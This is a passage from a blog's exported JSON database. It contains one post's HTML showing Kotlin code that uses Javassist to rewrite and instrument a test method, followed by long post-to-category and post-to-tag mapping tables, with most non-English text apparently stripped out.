Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<p>: setOp</p>\n<p>JavassistjavassistsetopbjavassistIntegersurf the internetasmasmasmjavassist</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistEdit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// ctClass,KotlinKt</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kim.bifrost.coldrain.partice.TestClass\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// ctClass</span>\n    <span class=\"token keyword\">val</span> ctMethod <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123; System.out.println(\\\"\\\"); &#125;\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// </span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertAfter</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"\n        System.out.println(\"\");\n        \"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// cflow</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">useCflow</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// test</span>\n    ctMethod<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"if ($\"</span><span class=\"token operator\">+</span> <span class=\"token string\">\"cflow(test) == 0)\"</span> <span class=\"token operator\">+</span>\n            <span class=\"token string\">\" System.out.println(\\\"test \\\");\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// newInstancecast,</span>\n    <span class=\"token punctuation\">(</span>ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> TestInterface<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> TestClass <span class=\"token operator\">:</span> TestInterface <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> TestInterface <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">test \n\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>TestClass</p>\n<p>ctClass</p>\n<p> setOp </p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clbx23jsr0001sfklfi3vci2u","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jt7000isfklcdhgboh1"},{"post_id":"clbx23jt6000gsfklaesxe5wv","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtb000osfklhxibal6r"},{"post_id":"clbx23jsw0003sfkl2mzc28th","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtd000ssfkleec3aqh9"},{"post_id":"clbx23jt7000hsfkl235232wz","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jte000vsfklcw2u0t81"},{"post_id":"clbx23jt9000lsfklbsrlc7vb","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtf000zsfklgk4p8cvj"},{"post_id":"clbx23jt10007sfkl013k28dw","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtg0011sfklfltdfd6d"},{"post_id":"clbx23jta000nsfklbipc5s6n","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtg0013sfklbfwnchpi"},{"post_id":"clbx23jtd000rsfkl1xt22b85","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jth0017sfklfo9p0sna"},{"post_id":"clbx23jt20009sfklau6n5ido","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jti001asfkl94cc681h"},{"post_id":"clbx23jtd000usfkl4cld3upt","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtj001dsfklaft511jv"},{"post_id":"clbx23jtf000ysfklcmlh04lk","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtk001gsfklajr0ev93"},{"post_id":"clbx23jt4000bsfkl6j730i2d","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtl001jsfklc7h40uxx"},{"post_id":"clbx23jtf0010sfkldviu9u2k","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtm001msfkl29gzd2kd"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtn001psfkl4b2faav6"},{"post_id":"clbx23jth0016sfklgu2uh9hd","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtn001rsfkl4l3v5ddw"},{"post_id":"clbx23jti0019sfklbmdg9mpg","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jto001tsfklfd0wbgyh"},{"post_id":"clbx23jtj001csfkl45gq6z40","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtq001xsfklfdd08022"},{"post_id":"clbx23jtj001fsfklbdd82igs","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtq0020sfklex1ibw14"},{"post_id":"clbx23jtl001isfkl24s4a9tv","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtr0023sfkl16gb5q8v"},{"post_id":"clbx23jtl001lsfkl21kf7x01","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jts0025sfklhmw094u7"},{"post_id":"clbx23jtm001osfklftyf0ncv","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtt0028sfkladns96iv"},{"post_id":"clbx23jtn001qsfkl05h6fhhk","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtt002bsfkle9in1ecm"},{"post_id":"clbx23jto001ssfkl54o8fl99","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtv002fsfkl9m5ndilc"},{"post_id":"clbx23jtp001wsfkl246n0xu0","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtw002isfkl9wrgdslv"},{"post_id":"clbx23jtq001zsfklcm6g2vie","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23jtx002lsfkl0vtp7me5"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jty002osfklaygt13ip"},{"post_id":"clbx23jtr0024sfklgnvq6hh0","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23jtz002rsfklgq2zhzxz"},{"post_id":"clbx23jts0027sfkl9j2b3f4m","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju0002vsfklew312wkr"},{"post_id":"clbx23jtt002asfklccn5f8w7","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju0002xsfkl08f12dkw"},{"post_id":"clbx23jtu002esfklfuouehul","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10030sfkl18hw2rfv"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","category_id":"clbx23jsy0004sfklh6q8cvzl","_id":"clbx23ju10032sfklg48409s4"},{"post_id":"clbx23jtx002nsfkl1shb8n78","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10035sfkl4f4jdb7u"},{"post_id":"clbx23jty002qsfklcez0fbg1","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10037sfkl29gw8br5"},{"post_id":"clbx23ju0002usfkla1pfcl4g","category_id":"clbx23jt5000csfkl1nu38gkl","_id":"clbx23ju10038sfkl3zh6hpin"},{"post_id":"clbx23jtw002ksfkl1hhcetty","category_id":"clbx23jty002psfkl4w9y0uxc","_id":"clbx23ju1003bsfklaz6h4ope"}],"PostTag":[{"post_id":"clbx23jsr0001sfklfi3vci2u","tag_id":"clbx23jt00005sfkl31xhgp1t","_id":"clbx23jt5000esfklctw91u8k"},{"post_id":"clbx23jsw0003sfkl2mzc28th","tag_id":"clbx23jt5000dsfklbjfqhka1","_id":"clbx23jta000msfkl1xao5bvg"},{"post_id":"clbx23jt10007sfkl013k28dw","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23jtd000tsfkl1nkhhd9v"},{"post_id":"clbx23jt20009sfklau6n5ido","tag_id":"clbx23jtc000qsfklabkydf14","_id":"clbx23jth0015sfkl5os27k0l"},{"post_id":"clbx23jt20009sfklau6n5ido","tag_id":"clbx23jtf000xsfkl39kj13cp","_id":"clbx23jti0018sfklggk1fn1o"},{"post_id":"clbx23jt4000bsfkl6j730i2d","tag_id":"clbx23jth0014sfkl40hi27vh","_id":"clbx23jtj001esfklgyd52fca"},{"post_id":"clbx23jt6000gsfklaesxe5wv","tag_id":"clbx23jti001bsfkl78tv6pc3","_id":"clbx23jtl001ksfklgmm2h69u"},{"post_id":"clbx23jt7000hsfkl235232wz","tag_id":"clbx23jtk001hsfkl19xub070","_id":"clbx23jtp001vsfklgog5ddaf"},{"post_id":"clbx23jt7000hsfkl235232wz","tag_id":"clbx23jtm001nsfkl9tf97p7j","_id":"clbx23jtq001ysfkl8x6r7nou"},{"post_id":"clbx23jt9000lsfklbsrlc7vb","tag_id":"clbx23jtp001usfkl8zg337ee","_id":"clbx23jtt0029sfkl3dkd9t5b"},{"post_id":"clbx23jt9000lsfklbsrlc7vb","tag_id":"clbx23jtq0021sfklca3sf5ys","_id":"clbx23jtu002csfkla83f35nu"},{"post_id":"clbx23jta000nsfklbipc5s6n","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23jtv002gsfklh4ioezrx"},{"post_id":"clbx23jta000nsfklbipc5s6n","tag_id":"clbx23jts0026sfkl53er7zxi","_id":"clbx23jtw002jsfkl95rabz5p"},{"post_id":"clbx23jtx002nsfkl1shb8n78","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju0002tsfkl5lxv7dy5"},{"post_id":"clbx23jtx002nsfkl1shb8n78","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju0002wsfkld7k80cue"},{"post_id":"clbx23jtd000rsfkl1xt22b85","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju0002zsfklf6xo8v4a"},{"post_id":"clbx23jtd000rsfkl1xt22b85","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju10031sfklfmcc5s17"},{"post_id":"clbx23jtd000usfkl4cld3upt","tag_id":"clbx23jtz002ssfkl9som4vvj","_id":"clbx23ju10033sfklbeuvhetu"},{"post_id":"clbx23jtf000ysfklcmlh04lk","tag_id":"clbx23ju0002ysfkl7sbn8i73","_id":"clbx23ju10036sfkl3tlr630b"},{"post_id":"clbx23jtf0010sfkldviu9u2k","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23ju1003asfkl0lvl2b3k"},{"post_id":"clbx23jtf0010sfkldviu9u2k","tag_id":"clbx23ju10034sfkl02pz5k1j","_id":"clbx23ju1003csfkl7ih1esgl"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23ju2003gsfkleuqv8q6u"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","tag_id":"clbx23ju1003dsfklf51t7jxu","_id":"clbx23ju2003hsfkl9flbg73u"},{"post_id":"clbx23jtg0012sfkl32lr2xt5","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju3003jsfkl0pwh8zcx"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju2003fsfkl7wh2a9mw","_id":"clbx23ju4003nsfkl3enxg9r1"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju2003isfklhmeme1wb","_id":"clbx23ju4003osfkl04dfahrv"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju3003ksfklehqnccxf","_id":"clbx23ju4003qsfkl1ts4106w"},{"post_id":"clbx23jth0016sfklgu2uh9hd","tag_id":"clbx23ju3003lsfkl4ii0ae7b","_id":"clbx23ju4003rsfklc717400v"},{"post_id":"clbx23jti0019sfklbmdg9mpg","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju5003usfkl0dpx6rz9"},{"post_id":"clbx23jti0019sfklbmdg9mpg","tag_id":"clbx23ju4003psfkl2xr61e7i","_id":"clbx23ju5003vsfkl05inehmi"},{"post_id":"clbx23jti0019sfklbmdg9mpg","tag_id":"clbx23ju4003ssfkl69jnfgbg","_id":"clbx23ju5003xsfklfgkre3y7"},{"post_id":"clbx23jtj001fsfklbdd82igs","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju60040sfklen2k39os"},{"post_id":"clbx23jtj001fsfklbdd82igs","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju60041sfklhq9fcp7k"},{"post_id":"clbx23jtj001fsfklbdd82igs","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23ju60043sfkl5qg4ekku"},{"post_id":"clbx23jtl001isfkl24s4a9tv","tag_id":"clbx23ju6003zsfkl5s979v58","_id":"clbx23ju60044sfkle6ludmcg"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju70049sfkl5d308ouc"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23ju7004asfkld495fe44"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23ju8004csfklfopkc4o3"},{"post_id":"clbx23jtl001lsfkl21kf7x01","tag_id":"clbx23ju3003ksfklehqnccxf","_id":"clbx23ju8004dsfkl7ppf1o7u"},{"post_id":"clbx23jtm001osfklftyf0ncv","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju8004fsfkl8sdoaqx8"},{"post_id":"clbx23jtm001osfklftyf0ncv","tag_id":"clbx23ju7004bsfkl2vbmh251","_id":"clbx23ju8004gsfkl1zji150r"},{"post_id":"clbx23jtm001osfklftyf0ncv","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23ju8004isfklcl9y634r"},{"post_id":"clbx23jtn001qsfkl05h6fhhk","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju9004ksfkl90yv908r"},{"post_id":"clbx23jtn001qsfkl05h6fhhk","tag_id":"clbx23ju8004hsfkl39pz62us","_id":"clbx23ju9004lsfkl13bn4uem"},{"post_id":"clbx23jto001ssfkl54o8fl99","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23ju9004nsfklbmhj4wcr"},{"post_id":"clbx23jtp001wsfkl246n0xu0","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jua004qsfkl5mrjgool"},{"post_id":"clbx23jtp001wsfkl246n0xu0","tag_id":"clbx23ju9004osfkl0zy99u9l","_id":"clbx23jua004rsfkl9j6bfknc"},{"post_id":"clbx23jtp001wsfkl246n0xu0","tag_id":"clbx23jt5000dsfklbjfqhka1","_id":"clbx23jua004tsfkl5g4pcokz"},{"post_id":"clbx23jtq001zsfklcm6g2vie","tag_id":"clbx23ju9004psfkl7xvie6yw","_id":"clbx23jub004wsfkl2ajy1cpk"},{"post_id":"clbx23jtq001zsfklcm6g2vie","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jub004xsfkl170yaghy"},{"post_id":"clbx23jtq001zsfklcm6g2vie","tag_id":"clbx23jua004usfkl9b5o1q8x","_id":"clbx23jub004zsfkl1ncp1afx"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juc0052sfkl7xdv1xpo"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","tag_id":"clbx23jub004ysfkl8l2r6lah","_id":"clbx23juc0053sfklde2idbex"},{"post_id":"clbx23jtr0022sfkl1hq5boc3","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23juc0055sfklc1zt7j4i"},{"post_id":"clbx23jtr0024sfklgnvq6hh0","tag_id":"clbx23jt7000ksfklhl2o3tk6","_id":"clbx23juc0056sfklckpvdwr3"},{"post_id":"clbx23jtr0024sfklgnvq6hh0","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juc0058sfkld2f6bi6n"},{"post_id":"clbx23jts0027sfkl9j2b3f4m","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jud005asfkl87unai8y"},{"post_id":"clbx23jts0027sfkl9j2b3f4m","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23jud005bsfkl8yj49ttj"},{"post_id":"clbx23jtt002asfklccn5f8w7","tag_id":"clbx23juc0059sfklf2rahwzf","_id":"clbx23jud005esfkl02618h4d"},{"post_id":"clbx23jtt002asfklccn5f8w7","tag_id":"clbx23jud005csfkl9o4ufkp9","_id":"clbx23jud005fsfklgzg9h236"},{"post_id":"clbx23jtu002esfklfuouehul","tag_id":"clbx23juc0059sfklf2rahwzf","_id":"clbx23jue005isfklgt55fsys"},{"post_id":"clbx23jtu002esfklfuouehul","tag_id":"clbx23jud005csfkl9o4ufkp9","_id":"clbx23jue005jsfkl7kleg8x3"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juf005nsfklf3l097x1"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jua004usfkl9b5o1q8x","_id":"clbx23juf005osfkldrnd2gxw"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jth0014sfkl40hi27vh","_id":"clbx23juf005qsfkl73j753ug"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jue005lsfklf120c2u9","_id":"clbx23juf005rsfklev1m31v1"},{"post_id":"clbx23jtw002ksfkl1hhcetty","tag_id":"clbx23jua004usfkl9b5o1q8x","_id":"clbx23jug005tsfkl996oemq4"},{"post_id":"clbx23jtw002ksfkl1hhcetty","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jug005usfklat3y1qdz"},{"post_id":"clbx23jty002qsfklcez0fbg1","tag_id":"clbx23juf005ssfkl1v0h038v","_id":"clbx23juh005ysfkl48kx46px"},{"post_id":"clbx23jty002qsfklcez0fbg1","tag_id":"clbx23jug005vsfkl3tc22cuc","_id":"clbx23juh005zsfkl9wgbem5g"},{"post_id":"clbx23jty002qsfklcez0fbg1","tag_id":"clbx23ju1003dsfklf51t7jxu","_id":"clbx23juh0060sfkl4tkw3yi2"},{"post_id":"clbx23ju0002usfkla1pfcl4g","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23juh0061sfklarnh6ltd"},{"post_id":"clbx23ju0002usfkla1pfcl4g","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juh0062sfkl5di623u7"},{"post_id":"clbx23ju0002usfkla1pfcl4g","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23juh0063sfklf20gdkzs"}],"Tag":[{"name":"","_id":"clbx23jt00005sfkl31xhgp1t"},{"name":"","_id":"clbx23jt5000dsfklbjfqhka1"},{"name":"Android","_id":"clbx23jt7000ksfklhl2o3tk6"},{"name":"javascript","_id":"clbx23jtc000qsfklabkydf14"},{"name":"","_id":"clbx23jtf000xsfkl39kj13cp"},{"name":"MySQL","_id":"clbx23jth0014sfkl40hi27vh"},{"name":"","_id":"clbx23jti001bsfkl78tv6pc3"},{"name":"linux","_id":"clbx23jtk001hsfkl19xub070"},{"name":"arch linux","_id":"clbx23jtm001nsfkl9tf97p7j"},{"name":"rust","_id":"clbx23jtp001usfkl8zg337ee"},{"name":"docker","_id":"clbx23jtq0021sfklca3sf5ys"},{"name":"framework","_id":"clbx23jts0026sfkl53er7zxi"},{"name":"Java","_id":"clbx23jtu002dsfkldcohdj4b"},{"name":"Kotlin","_id":"clbx23jtx002msfkl3o7b2g4u"},{"name":"git","_id":"clbx23jtz002ssfkl9som4vvj"},{"name":"maven","_id":"clbx23ju0002ysfkl7sbn8i73"},{"name":"MVVM","_id":"clbx23ju10034sfkl02pz5k1j"},{"name":"","_id":"clbx23ju10039sfkl1rovh9vd"},{"name":"ASM","_id":"clbx23ju1003dsfklf51t7jxu"},{"name":"Minecraft","_id":"clbx23ju2003fsfkl7wh2a9mw"},{"name":"Forge","_id":"clbx23ju2003isfklhmeme1wb"},{"name":"","_id":"clbx23ju3003ksfklehqnccxf"},{"name":"Mixin","_id":"clbx23ju3003lsfkl4ii0ae7b"},{"name":"SpringBoot","_id":"clbx23ju4003psfkl2xr61e7i"},{"name":"","_id":"clbx23ju4003ssfkl69jnfgbg"},{"name":"Idea","_id":"clbx23ju6003zsfkl5s979v58"},{"name":"Compose","_id":"clbx23ju7004bsfkl2vbmh251"},{"name":"","_id":"clbx23ju8004hsfkl39pz62us"},{"name":"Coroutine","_id":"clbx23ju9004osfkl0zy99u9l"},{"name":"Bukkit","_id":"clbx23ju9004psfkl7xvie6yw"},{"name":"TabooLib","_id":"clbx23jua004usfkl9b5o1q8x"},{"name":"","_id":"clbx23jub004ysfkl8l2r6lah"},{"name":"Rust","_id":"clbx23juc0059sfklf2rahwzf"},{"name":"Rust","_id":"clbx23jud005csfkl9o4ufkp9"},{"name":"","_id":"clbx23jue005lsfklf120c2u9"},{"name":"JVM","_id":"clbx23juf005ssfkl1v0h038v"},{"name":"","_id":"clbx23jug005vsfkl3tc22cuc"}]}}